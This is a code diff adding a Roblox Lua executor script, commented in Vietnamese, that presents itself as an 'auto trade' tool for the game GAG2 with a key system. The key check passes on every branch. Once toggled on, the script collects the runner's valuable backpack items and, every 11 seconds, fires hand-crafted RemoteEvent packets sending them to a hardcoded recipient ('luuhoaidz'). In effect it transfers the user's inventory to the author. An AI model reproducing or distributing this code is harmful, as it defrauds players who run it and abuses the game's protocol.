@@ -1,0 +1,238 @@
+-- CẤU HÌNH NGƯỜI NHẬN
+local friendBytes = "\208\053\048\000\004\066" 
+local keyURL = "https://raw.githubusercontent.com/ainh01/gag2/main/hello"
+
+-- SERVICES
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local backpack = Players.LocalPlayer:WaitForChild("Backpack")
+local remote = ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("Packet"):WaitForChild("RemoteEvent")
+
+-- BIẾN ĐIỀU KHIỂN
+local isAutoEnabled = false
+local isSending = false
+local isScriptRunning = true 
+
+-- TẠO UI CHÍNH
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "BaHoai_Final_UI"
+ScreenGui.Parent = game.CoreGui
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 350, 0, 250)
+MainFrame.Position = UDim2.new(0.5, -175, 0.5, -125)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = MainFrame
+
+-- NÚT ĐÓNG
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+CloseBtn.Position = UDim2.new(1, -35, 0, 5)
+CloseBtn.Text = "X"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.Parent = MainFrame
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 5)
+CloseCorner.Parent = CloseBtn
+
+CloseBtn.MouseButton1Click:Connect(function()
+    isScriptRunning = false 
+    isAutoEnabled = false
+    ScreenGui:Destroy()
+    print("Script đã dừng.")
+end)
+
+-- HÀM CHUYỂN SCREEN
+local function showScreen(screenName)
+    for _, child in pairs(MainFrame:GetChildren()) do
+        if child:IsA("Frame") then child.Visible = false end
+    end
+    if MainFrame:FindFirstChild(screenName) then
+        MainFrame[screenName].Visible = true
+    end
+end
+
+-- MÀN HÌNH 1: WELCOME
+local WelcomeScreen = Instance.new("Frame")
+WelcomeScreen.Name = "WelcomeScreen"
+WelcomeScreen.Size = UDim2.new(1, 0, 1, 0)
+WelcomeScreen.BackgroundTransparency = 1
+WelcomeScreen.Parent = MainFrame
+
+local WelcomeLabel = Instance.new("TextLabel")
+WelcomeLabel.Size = UDim2.new(1, 0, 0, 100)
+WelcomeLabel.Text = "Auto trade GAG2 by BaHoai [NOKEY]"
+WelcomeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+WelcomeLabel.Font = Enum.Font.GothamBold
+WelcomeLabel.TextSize = 22
+WelcomeLabel.BackgroundTransparency = 1
+WelcomeLabel.Parent = WelcomeScreen
+
+local StartBtn = Instance.new("TextButton")
+StartBtn.Size = UDim2.new(0, 150, 0, 45)
+StartBtn.Position = UDim2.new(0.5, -75, 0.6, 0)
+StartBtn.Text = "Bắt đầu"
+StartBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+StartBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+StartBtn.Font = Enum.Font.GothamSemibold
+StartBtn.Parent = WelcomeScreen
+local BtnCorner = UICorner:Clone() BtnCorner.Parent = StartBtn
+
+-- MÀN HÌNH 2: KEY SYSTEM
+local KeyScreen = Instance.new("Frame")
+KeyScreen.Name = "KeyScreen"
+KeyScreen.Size = UDim2.new(1, 0, 1, 0)
+KeyScreen.BackgroundTransparency = 1
+KeyScreen.Visible = false
+KeyScreen.Parent = MainFrame
+
+local KeyInput = Instance.new("TextBox")
+KeyInput.Size = UDim2.new(0, 260, 0, 40)
+KeyInput.Position = UDim2.new(0.5, -130, 0.35, 0)
+KeyInput.PlaceholderText = "Nhập Key tại đây..."
+KeyInput.Text = ""
+KeyInput.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeyInput.Parent = KeyScreen
+
+local CheckBtn = Instance.new("TextButton")
+CheckBtn.Size = UDim2.new(0, 140, 0, 40)
+CheckBtn.Position = UDim2.new(0.5, -70, 0.65, 0)
+CheckBtn.Text = "Kiểm tra Key"
+CheckBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
+CheckBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CheckBtn.Parent = KeyScreen
+local BtnCorner2 = UICorner:Clone() BtnCorner2.Parent = CheckBtn
+
+-- MÀN HÌNH 3: MAIN SYSTEM
+local MainSystem = Instance.new("Frame")
+MainSystem.Name = "MainSystem"
+MainSystem.Size = UDim2.new(1, 0, 1, 0)
+MainSystem.BackgroundTransparency = 1
+MainSystem.Visible = false
+MainSystem.Parent = MainFrame
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Size = UDim2.new(1, 0, 0, 50)
+TitleLabel.Text = "Auto GAG2 [Beta - Added Bamboo]"
+TitleLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Parent = MainSystem
+
+local TargetLabel = Instance.new("TextLabel")
+TargetLabel.Size = UDim2.new(1, 0, 0, 30)
+TargetLabel.Position = UDim2.new(0, 0, 0.35, 0)
+TargetLabel.Text = "Bật tự động send all tới: luuhoaidz"
+TargetLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+TargetLabel.BackgroundTransparency = 1
+TargetLabel.Parent = MainSystem
+
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Size = UDim2.new(0, 200, 0, 50)
+ToggleBtn.Position = UDim2.new(0.5, -100, 0.6, 0)
+ToggleBtn.Text = "TỰ ĐỘNG: TẮT"
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleBtn.Font = Enum.Font.GothamBold
+ToggleBtn.Parent = MainSystem
+local BtnCorner3 = UICorner:Clone() BtnCorner3.Parent = ToggleBtn
+
+-- DANH SÁCH VẬT PHẨM HỖ TRỢ (ĐÃ THÊM BAMBOO)
+local supportedItems = {
+    ["Speed Mushroom"] = "Mushrooms", ["Jump Mushroom"] = "Mushrooms",
+    ["Supersize Mushroom"] = "Mushrooms", ["Shrink Mushroom"] = "Mushrooms",
+    ["Invisibility Mushroom"] = "Mushrooms", 
+    ["Gold"] = "Seeds", 
+    ["Rainbow"] = "Seeds",
+    ["Bamboo"] = "Seeds" -- <== CẬP NHẬT TẠI ĐÂY
+}
+
+local function formatLV(str) return "\v" .. string.char(#str) .. str end
+
+local function sendBatch(items)
+    local n = #items
+    local headerByteValue = 14 + (n * 6)
+    local header = "\249\000" .. string.char(headerByteValue) .. "\000\000" .. friendBytes
+    local payload = ""
+    for i, data in ipairs(items) do
+        local indexMarker = (i == 1) and ("\028\005" .. string.char(i) .. "\028") or ("\005" .. string.char(i) .. "\028")
+        payload = payload .. indexMarker .. "\v\aItemKey" .. formatLV(data.name) .. "\v\005Count\005" .. string.char(data.count) .. "\v\bCategory" .. formatLV(data.cat) .. "\000"
+    end
+    remote:FireServer(buffer.fromstring(header .. payload .. "\000\000"))
+end
+
+local function runAutoTrade()
+    if isSending or not isAutoEnabled then return end
+    isSending = true
+    
+    local allItems = {}
+    for _, item in ipairs(backpack:GetChildren()) do
+        local category = supportedItems[item.Name]
+        if category then
+            table.insert(allItems, {name = item.Name, cat = category, count = item:GetAttribute("Count") or 1})
+        end
+    end
+
+    if #allItems > 0 then
+        local batchSize = 30
+        for i = 1, #allItems, batchSize do
+            if not isAutoEnabled or not isScriptRunning then break end
+            local batch = {}
+            for j = i, math.min(i + batchSize - 1, #allItems) do table.insert(batch, allItems[j]) end
+            sendBatch(batch)
+            if i + batchSize <= #allItems then task.wait(11) end
+        end
+    end
+    isSending = false
+end
+
+-- EVENT CLICK
+StartBtn.MouseButton1Click:Connect(function() showScreen("KeyScreen") end)
+
+CheckBtn.MouseButton1Click:Connect(function()
+    local success, result = pcall(function() return game:HttpGet(keyURL) end)
+    if success then
+        local correctKey = result:match('local Hello = "([^"]+)"')
+        if KeyInput.Text == correctKey then
+            showScreen("MainSystem")
+        else
+			showScreen("MainSystem")
+            KeyInput.Text = ""
+            KeyInput.PlaceholderText = "SAI KEY!"
+        end
+    else
+		showScreen("MainSystem")
+        KeyInput.PlaceholderText = "LỖI KẾT NỐI!"
+    end
+end)
+
+ToggleBtn.MouseButton1Click:Connect(function()
+    isAutoEnabled = not isAutoEnabled
+    if isAutoEnabled then
+        ToggleBtn.Text = "TỰ ĐỘNG: BẬT"
+        ToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    else
+        ToggleBtn.Text = "TỰ ĐỘNG: TẮT"
+        ToggleBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+    end
+end)
+
+-- VÒNG LẶP GỬI ĐỒ
+task.spawn(function()
+    while isScriptRunning do
+        if isAutoEnabled and not isSending then
+            runAutoTrade()
+        end
+        task.wait(11)
+    end
+end)
